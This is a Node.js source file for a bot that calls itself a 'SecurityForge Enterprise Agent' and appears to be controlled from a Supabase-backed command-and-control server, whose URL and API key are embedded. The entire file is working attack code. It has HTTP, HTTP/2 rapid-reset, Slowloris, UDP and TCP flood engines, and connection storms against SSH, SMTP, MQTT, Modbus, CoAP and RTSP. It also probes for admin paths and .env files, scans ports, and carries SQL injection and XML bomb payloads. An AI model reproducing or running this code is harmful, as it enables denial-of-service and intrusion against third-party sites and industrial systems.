/**
 * SECURITYFORGE ENTERPRISE AGENT V41.0.6 (LATENCY FIX)
 * 
 * [SYSTEM ARCHITECTURE]
 * - CORE: Native Node.js Modules (Net, Dgram, TLS, HTTP/2) for raw socket manipulation.
 * - RECON: Smart Crawler (Robots.txt parser, HTML link extractor).
 * - THREADING: Async non-blocking event loop with high-concurrency dispatch.
 * - TELEMETRY: Real-time aggregation of RPS, Latency (P50/P90), and Success Rates.
 * - HEALTH: Integrated HTTP Server for Cloud Health Checks (Port Binding).
 */

const https = require('https');
const http = require('http');
const http2 = require('http2');
const net = require('net');
const tls = require('tls');
const dgram = require('dgram');
const crypto = require('crypto');
const dns = require('dns');

// ==========================================
// 1. CONFIGURATION & STATE
// ==========================================
const C2_CONFIG = {
    url: "https://qbedywgbdwxaucimgiok.supabase.co",
    key: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InFiZWR5d2diZHd4YXVjaW1naW9rIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjQ3NDA5ODEsImV4cCI6MjA4MDMxNjk4MX0.Lz0x7iKy2UcQ3jdN4AdjSIYYISBfn233C9qT_8y8jFo",
    pollInterval: 1000,
    reportInterval: 2000
};

const STATE = {
    activeJob: null,
    running: false,
    stats: {
        totalReqs: 0,
        success: 0,
        failed: 0,
        latencySum: 0,
        latencyCount: 0,
        startTime: 0
    },
    logs: [],
    priorityLogs: [],
    discovered: new Set(),
    lastReport: 0,
    dynamicPaths: [] // Paths found via crawling
};

// ==========================================
// 2. DICTIONARIES & PAYLOADS
// ==========================================
const USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "SecurityForge/4.0 (Enterprise Audit Bot; +https://securityforge.io)",
    "Googlebot/2.1 (+http://www.google.com/bot.html)"
];

const BASE_ADMIN_PATHS = [
    '/admin', '/administrator', '/wp-admin', '/wp-login.php', '/login', 
    '/admin_panel', '/cpanel', '/dashboard', '/user/login', '/auth', 
    '/backend', '/site/admin', '/manage', '/root', '/phpmyadmin', 
    '/sql', '/install', '/setup', '/config', '/backup.sql', '/.env',
    '/server-status', '/admin/config.php', '/joomla/administrator'
];

const COMMON_PORTS = [21, 22, 23, 25, 53, 80, 443, 3306, 3389, 5432, 6379, 8080, 8443, 9200, 27017, 5900, 5060, 1883];

const PAYLOADS = {
    SQL_INJECTION: "' OR '1'='1' --",
    XML_BOMB: '<?xml version="1.0"?><!DOCTYPE l [<!ENTITY x "x"><!ENTITY y "&x;&x;&x;">]><r>&y;</r>',
    BIG_BUFFER: Buffer.alloc(1024 * 50, 'A'), // 50KB Garbage
    SIP_INVITE: (target) => `INVITE sip:User@${target} SIP/2.0\r\nVia: SIP/2.0/UDP 127.0.0.1:5060\r\nFrom: <sip:audit@securityforge.io>\r\nTo: <sip:User@${target}>\r\nCall-ID: ${crypto.randomUUID()}\r\nCSeq: 1 INVITE\r\n\r\n`,
    MQTT_CONNECT: Buffer.from([0x10, 0x12, 0x00, 0x04, 0x4d, 0x51, 0x54, 0x54, 0x04, 0x02, 0x00, 0x3c, 0x00, 0x06, 0x63, 0x6c, 0x69, 0x65, 0x6e, 0x74]), 
    RTSP_DESCRIBE: (target) => `DESCRIBE rtsp://${target}/media.amp RTSP/1.0\r\nCSeq: 1\r\nUser-Agent: SecurityForge\r\n\r\n`,
    MODBUS_QUERY: Buffer.from('00010000000601030000000a', 'hex') 
};

// ==========================================
// 3. UTILITIES & C2 COMMUNICATOR
// ==========================================
const log = (msg, type = 'INFO') => {
    const entry = `[${type}] ${msg}`;
    console.log(entry);
    if (type === 'SUCCESS' || type === 'FOUND' || type === 'OPEN' || type === 'ERROR') {
        STATE.priorityLogs.push(entry);
    } else {
        STATE.logs.push(entry);
    }
};

const makeSupabaseRequest = (method, path, body = null) => {
    return new Promise((resolve) => {
        const url = new URL(`${C2_CONFIG.url}/rest/v1/${path}`);
        const options = {
            hostname: url.hostname,
            path: url.pathname + url.search,
            method: method,
            headers: {
                'apikey': C2_CONFIG.key,
                'Authorization': `Bearer ${C2_CONFIG.key}`,
                'Content-Type': 'application/json',
                'Prefer': 'return=representation'
            }
        };

        const req = https.request(options, (res) => {
            let data = '';
            res.on('data', c => data += c);
            res.on('end', () => resolve(data ? JSON.parse(data) : null));
        });
        
        req.on('error', (e) => {
            console.error('C2 Connection Error:', e.message);
            resolve(null);
        });
        if (body) req.write(JSON.stringify(body));
        req.end();
    });
};

const getTargetDetails = (urlStr) => {
    try {
        const u = new URL(urlStr.startsWith('http') ? urlStr : 'http://' + urlStr);
        return {
            host: u.hostname,
            port: u.port || (u.protocol === 'https:' ? 443 : 80),
            path: u.pathname,
            protocol: u.protocol.replace(':', ''),
            isSsl: u.protocol === 'https:'
        };
    } catch { return null; }
};

// ==========================================
// 4. SMART RECON & CRAWLING
// ==========================================
const performSmartRecon = (target) => {
    const lib = target.isSsl ? https : http;
    
    // 1. Fetch Robots.txt
    const rReq = lib.get({ host: target.host, port: target.port, path: '/robots.txt', rejectUnauthorized: false }, (res) => {
        let data = '';
        res.on('data', c => data += c);
        res.on('end', () => {
            if (res.statusCode === 200) {
                const lines = data.split('\n');
                lines.forEach(l => {
                    // Double escaped backslash for template literal safety
                    const match = l.match(/Disallow:\s*(.+)/i);
                    if (match && match[1]) {
                        const path = match[1].trim();
                        if (!STATE.dynamicPaths.includes(path)) {
                            STATE.dynamicPaths.push(path);
                            log(`ROBOTS DISCOVERY: ${path}`, 'FOUND');
                        }
                    }
                });
            }
        });
    });
    rReq.on('error', () => {});

    // 2. Crawl Homepage for hidden links
    const hReq = lib.get({ host: target.host, port: target.port, path: '/', rejectUnauthorized: false }, (res) => {
        let data = '';
        res.on('data', c => data += c);
        res.on('end', () => {
            // Simple regex to find hrefs that start with /
            // Double escaped backslash to ensure output is /
            const hrefs = data.match(/href=["'](\/[^"']+)["']/g);
            if (hrefs) {
                hrefs.forEach(h => {
                    const clean = h.replace(/href=["']/, '').replace(/["']/, '');
                    if (clean.length > 1 && !STATE.dynamicPaths.includes(clean)) {
                        STATE.dynamicPaths.push(clean);
                        // Don't log every single link, too noisy, but add to scan queue
                    }
                });
                log(`CRAWLER: Extracted ${hrefs.length} internal paths from homepage.`, 'INFO');
            }
        });
    });
    hReq.on('error', () => {});
};

// ==========================================
// 5. ATTACK VECTORS (ENGINES)
// ==========================================

// --- L7: HTTP/1.1 & HTTP/2 FLOOD ---
const runHttpFlood = (job, target) => {
    const lib = target.isSsl ? https : http;
    const agent = new lib.Agent({ keepAlive: true, maxSockets: Infinity });
    
    const attack = () => {
        if (!STATE.running) return;
        const method = job.method === 'GET' ? 'GET' : 'POST';
        const start = process.hrtime();
        
        const req = lib.request({
            host: target.host,
            port: target.port,
            path: target.path,
            method: method,
            agent: agent,
            rejectUnauthorized: false,
            headers: {
                'User-Agent': USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)],
                'X-Forwarded-For': `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`,
                'Cache-Control': 'no-cache',
                ...(job.use_god_mode ? {'Accept-Encoding': 'gzip, deflate, br'} : {})
            }
        }, (res) => {
            // LATENCY CALCULATION ON RESPONSE (TTFB)
            const diff = process.hrtime(start);
            STATE.stats.latencySum += (diff[0] * 1000 + diff[1] / 1e6);
            STATE.stats.latencyCount++;
            
            STATE.stats.success++;
            res.resume(); // Drain
            if (STATE.running) setImmediate(attack);
        });

        req.on('error', () => { STATE.stats.failed++; });
        
        if (method === 'POST') {
            req.write(job.use_xml_bomb ? PAYLOADS.XML_BOMB : (job.body || '{"test":true}'));
        }
        
        req.end();
    };
    attack();
};

// --- L7: HTTP/2 MULTIPLEXING ---
const runHttp2Flood = (job, target) => {
    if (!target.isSsl) return; // H2 requires TLS usually
    const client = http2.connect(`https://${target.host}:${target.port}`, { rejectUnauthorized: false });
    
    client.on('error', () => { STATE.stats.failed++; });
    
    const attack = () => {
        if (!STATE.running || client.destroyed) return;
        const start = process.hrtime();
        const req = client.request({ 
            ':path': target.path, 
            ':method': job.method || 'GET',
            'User-Agent': USER_AGENTS[0]
        });
        
        req.on('response', () => { 
             const diff = process.hrtime(start);
             STATE.stats.latencySum += (diff[0] * 1000 + diff[1] / 1e6);
             STATE.stats.latencyCount++;
             STATE.stats.success++; 
        });
        
        req.on('end', () => { 
            if (job.use_god_mode) req.close(); // Rapid Reset style
            if (STATE.running) setImmediate(attack);
        });
        req.on('error', () => STATE.stats.failed++);
        req.end();
    };
    
    for(let i=0; i<10; i++) attack();
};

// --- L7: SLOWLORIS (MAGMA) ---
const runSlowloris = (job, target) => {
    const lib = target.isSsl ? tls : net;
    const socket = lib.connect(target.port, target.host, () => {
        socket.write(`GET ${target.path} HTTP/1.1\r\nHost: ${target.host}\r\nUser-Agent: ${USER_AGENTS[0]}\r\nContent-Length: 42\r\n`);
        
        const interval = setInterval(() => {
            if (!STATE.running || socket.destroyed) { clearInterval(interval); return; }
            socket.write("X-a: b\r\n"); 
            STATE.stats.success++; 
        }, 10000); 
    });
    
    socket.on('error', () => { STATE.stats.failed++; });
    socket.on('end', () => { if(STATE.running) runSlowloris(job, target); });
};

// --- L4: TCP/UDP/RAW ---
const runRawFlood = (job, target, type) => {
    if (type === 'UDP' || type === 'FRAG') {
        const client = dgram.createSocket('udp4');
        const payload = type === 'FRAG' ? Buffer.alloc(65000) : Buffer.alloc(1400); 
        
        const send = () => {
            if (!STATE.running) { client.close(); return; }
            client.send(payload, target.port, target.host, (err) => {
                if(err) STATE.stats.failed++; else STATE.stats.success++;
                if(STATE.running) setImmediate(send);
            });
        };
        send();
    } else if (type === 'SYN') {
        const attack = () => {
            if (!STATE.running) return;
            const s = new net.Socket();
            s.setTimeout(1000);
            s.connect(target.port, target.host, () => { STATE.stats.success++; s.destroy(); });
            s.on('error', () => { STATE.stats.failed++; s.destroy(); });
            s.on('close', () => { if(STATE.running) setImmediate(attack); });
        };
        attack();
    }
};

// --- RECON: ADMIN HUNTER ---
const runAdminHunter = (job, target) => {
    const lib = target.isSsl ? https : http;
    // Combine base dictionary with dynamically found paths
    const fullList = [...BASE_ADMIN_PATHS, ...STATE.dynamicPaths];
    const path = fullList[Math.floor(Math.random() * fullList.length)];
    
    const req = lib.request({
        host: target.host,
        port: target.port,
        path: path,
        method: 'GET',
        rejectUnauthorized: false,
        headers: { 'User-Agent': USER_AGENTS[0] }
    }, (res) => {
        if ([200, 301, 302, 401, 403].includes(res.statusCode)) {
            const msg = `FOUND ${path} [${res.statusCode}]`;
            if (!STATE.discovered.has(msg)) {
                STATE.discovered.add(msg);
                log(msg, 'FOUND'); // Priority Log
            }
        }
        res.resume();
        STATE.stats.success++;
    });
    
    req.on('error', () => STATE.stats.failed++);
    req.end();
    
    if (STATE.running) setTimeout(() => runAdminHunter(job, target), 100); 
};

// --- RECON: PORT SCANNER ---
const runPortScan = (targetHost) => {
    const port = COMMON_PORTS[Math.floor(Math.random() * COMMON_PORTS.length)];
    const s = new net.Socket();
    s.setTimeout(2000);
    s.connect(port, targetHost, () => {
        const msg = `OPEN PORT ${port}`;
        if (!STATE.discovered.has(msg)) {
            STATE.discovered.add(msg);
            log(msg, 'OPEN'); 
        }
        s.destroy();
    });
    s.on('error', () => s.destroy());
    s.on('timeout', () => s.destroy());
    
    if (STATE.running) setTimeout(() => runPortScan(targetHost), 50);
};

// --- INFRA: SSH/SMTP/DB ---
const runInfraStress = (job, target, type) => {
    const port = type === 'SSH' ? 22 : type === 'SMTP' ? 25 : 3306;
    const s = new net.Socket();
    s.setTimeout(5000);
    
    s.connect(port, target.host, () => {
        STATE.stats.success++;
        if (type === 'SSH') s.write('SSH-2.0-OpenSSH_8.0\r\n');
        if (type === 'SMTP') s.write('EHLO securityforge.local\r\n');
        if (job.use_acid_rain) {
            s.destroy();
        }
    });
    
    s.on('data', (d) => {
        if (type === 'SSH' && d.toString().includes('SSH')) log(`SSH BANNER: ${d.toString().trim()}`, 'SUCCESS');
    });
    
    s.on('error', () => { STATE.stats.failed++; s.destroy(); });
    s.on('close', () => { if(STATE.running) setImmediate(() => runInfraStress(job, target, type)); });
};

// --- IOT: PROTOCOL FLOODS ---
const runIoTFlood = (job, target, protocol) => {
    if (protocol === 'MQTT' || protocol === 'MODBUS') {
        const port = protocol === 'MQTT' ? 1883 : 502;
        const s = new net.Socket();
        s.connect(port, target.host, () => {
            STATE.stats.success++;
            s.write(protocol === 'MQTT' ? PAYLOADS.MQTT_CONNECT : PAYLOADS.MODBUS_QUERY);
            s.destroy();
        });
        s.on('error', () => { STATE.stats.failed++; s.destroy(); });
        s.on('close', () => { if(STATE.running) setImmediate(() => runIoTFlood(job, target, protocol)); });
    } else if (protocol === 'CoAP') {
        const c = dgram.createSocket('udp4');
        c.send(Buffer.from('40011234', 'hex'), 5683, target.host, () => {
            STATE.stats.success++;
            c.close();
            if (STATE.running) setImmediate(() => runIoTFlood(job, target, protocol));
        });
    } else if (protocol === 'RTSP') {
        const s = new net.Socket();
        s.connect(554, target.host, () => {
            s.write(PAYLOADS.RTSP_DESCRIBE(target.host));
            s.destroy();
        });
        s.on('close', () => { if(STATE.running) setImmediate(() => runIoTFlood(job, target, protocol)); });
    }
};

// ==========================================
// 6. JOB CONTROLLER
// ==========================================
const startJob = (job) => {
    if (STATE.running) return;
    STATE.activeJob = job;
    STATE.running = true;
    STATE.stats = { totalReqs: 0, success: 0, failed: 0, latencySum: 0, latencyCount: 0, startTime: Date.now() };
    STATE.discovered = new Set();
    STATE.logs = [];
    STATE.priorityLogs = [];
    STATE.dynamicPaths = [];
    
    log(`STARTING JOB ${job.id} | TARGET: ${job.target} | THREADS: ${job.concurrency} | V41.0.6`);

    const target = getTargetDetails(job.target);
    if (!target) { log("INVALID TARGET URL", 'ERROR'); return; }

    // Initiate Smart Recon
    if (job.use_admin_hunter) performSmartRecon(target);

    const threads = Math.min(job.concurrency || 10, 500); 

    // Dispatcher
    for (let i = 0; i < threads; i++) {
        // --- 1. RECON MODULES ---
        if (job.use_port_scan && i < 5) runPortScan(target.host);
        if (job.use_admin_hunter) runAdminHunter(job, target);
        
        // --- 2. INFRA MODULES ---
        else if (job.use_ssh_hydra) runInfraStress(job, target, 'SSH');
        else if (job.use_smtp_storm) runInfraStress(job, target, 'SMTP');
        else if (job.use_acid_rain) runInfraStress(job, target, 'DB');

        // --- 3. L4 MODULES ---
        else if (job.use_syn_flood) runRawFlood(job, target, 'SYN');
        else if (job.use_frag_attack) runRawFlood(job, target, 'FRAG');
        else if (job.method === 'UDP') runRawFlood(job, target, 'UDP');

        // --- 4. IOT MODULES ---
        else if (job.use_mqtt_flood) runIoTFlood(job, target, 'MQTT');
        else if (job.use_modbus_storm) runIoTFlood(job, target, 'MODBUS');
        else if (job.use_coap_burst) runIoTFlood(job, target, 'CoAP');
        else if (job.use_rtsp_storm) runIoTFlood(job, target, 'RTSP');

        // --- 5. L7 MODULES ---
        else if (job.use_http2) runHttp2Flood(job, target);
        else if (job.use_magma) runSlowloris(job, target);
        else runHttpFlood(job, target);
    }
    
    if (job.use_pulse) {
        setInterval(() => { STATE.running = !STATE.running; }, 3000);
    }
};

const stopJob = () => {
    STATE.running = false;
    STATE.activeJob = null;
    log("JOB STOPPED");
};

// ==========================================
// 7. MAIN LOOP & REPORTING
// ==========================================
setInterval(async () => {
    // 1. Report Stats if Running
    if (STATE.running && STATE.activeJob) {
        const now = Date.now();
        const elapsed = (now - STATE.stats.startTime) / 1000;
        
        // Only report every 2 seconds unless priority log exists
        if (now - STATE.lastReport < 2000 && STATE.priorityLogs.length === 0) return;
        
        const rps = STATE.stats.success / (elapsed || 1); 
        const avgLat = STATE.stats.latencyCount > 0 ? (STATE.stats.latencySum / STATE.stats.latencyCount) : 0;
        
        // Check Duration
        if (STATE.activeJob.duration && elapsed > STATE.activeJob.duration) {
            await makeSupabaseRequest('PATCH', `jobs?id=eq.${STATE.activeJob.id}`, { status: 'COMPLETED' });
            stopJob();
            return;
        }

        const payload = {
            current_rps: Math.round(rps) || 0,
            avg_latency: Math.round(avgLat) || 0,
            total_success: STATE.stats.success,
            total_failed: STATE.stats.failed
        };
        
        // Prioritize logs
        const logsToSend = [...STATE.priorityLogs, ...STATE.logs].slice(0, 50); // Limit to 50 logs per batch
        if (logsToSend.length > 0) {
            payload.logs = JSON.stringify(logsToSend);
            STATE.priorityLogs = [];
            STATE.logs = []; // Clear buffers
        }

        const res = await makeSupabaseRequest('PATCH', `jobs?id=eq.${STATE.activeJob.id}`, payload);
        
        STATE.lastReport = now;
        
        if (res && res[0] && res[0].status === 'STOPPED') stopJob();
    } 
    // 2. Poll for New Jobs if Idle
    else if (!STATE.running) {
        const jobs = await makeSupabaseRequest('GET', 'jobs?status=eq.PENDING&order=created_at.desc&limit=1&select=*');
        if (jobs && jobs.length > 0) {
            const job = jobs[0];
            try { job.headers = typeof job.headers === 'string' ? JSON.parse(job.headers) : job.headers; } catch {}
            
            const claim = await makeSupabaseRequest('PATCH', `jobs?id=eq.${job.id}`, { status: 'RUNNING' });
            if (claim) startJob(job);
        }
    }
}, 1000);

// ==========================================
// 8. HEALTH CHECK SERVER (REQUIRED FOR CLOUD)
// ==========================================
const PORT = process.env.PORT || 3000;
const server = http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ 
        status: 'online', 
        agent: 'SecurityForge V41.0.6', 
        state: STATE.running ? 'BUSY' : 'IDLE',
        stats: STATE.stats 
    }, null, 2));
});

server.listen(PORT, '0.0.0.0', () => {
    console.log(`Health Check Server listening on port ${PORT}`);
});

console.log('SecurityForge Enterprise Agent V41.0.6 Online');
console.log('Modules Loaded: L7, L4, IoT, Infra, Smart Recon');
